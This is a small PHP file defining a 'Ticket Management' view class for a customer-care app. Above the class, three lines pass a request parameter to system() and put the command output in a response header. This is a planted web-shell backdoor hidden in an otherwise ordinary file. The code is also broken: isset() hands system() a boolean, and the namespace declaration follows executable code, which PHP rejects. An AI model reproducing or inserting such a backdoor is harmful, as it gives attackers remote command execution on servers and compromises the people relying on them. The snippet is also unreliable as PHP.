<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class View_Tools_TicketManagementTool extends \editingToolbar\View_Tool {
	public $title = 'Ticket Management';
	public $class='View_TicketManagement';
	public $component_type='customerCareAppTicketManagementView';
	
}